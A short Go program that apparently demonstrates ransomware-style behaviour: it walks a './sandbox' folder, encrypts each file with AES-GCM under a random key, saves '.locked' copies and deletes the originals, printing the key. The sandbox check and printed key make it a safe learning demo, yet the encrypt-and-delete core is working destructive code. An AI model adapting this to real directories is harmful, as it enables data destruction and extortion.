package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

func main() {
	targetDir := "./sandbox"

	if _, err := os.Stat(targetDir); os.IsNotExist(err) {
		fmt.Println("Error: 'sandbox' folder not found. Create it first to play safe!")
		os.Exit(1)
	}

	key := make([]byte, 32)
	rand.Read(key)

	fmt.Printf("[*] Generated Key: %x\n", key)
	fmt.Println("[*] SAVE THIS KEY! You cannot decrypt without it")
	fmt.Println("[*] Starting encryption...")

	err := filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if info.IsDir() || filepath.Ext(path) == ".locked" {
			return nil
		}

		fmt.Printf(" -> Encrypting: %s\n", path)
		encryptFile(path, key)
		return nil
	})

	if err != nil {
		fmt.Printf("Error walking directory: %v\n", err)
	} else {
		fmt.Println("\n[+] LOCKDOWN COMPLETE")
	}
}

func encryptFile(filename string, key []byte) {
	plaintext, err := os.ReadFile(filename)
	if err != nil {
		fmt.Printf("	Error reading %s: %v\n", filename, err)
		return
	}

	// AES-GCM
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err)
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

	newFile := filename + ".locked"
	err = os.WriteFile(newFile, ciphertext, 0644)
	if err != nil {
		fmt.Printf("	Error writing %s: %v\n", newFile, err)
		return
	}

	os.Remove(filename)
}
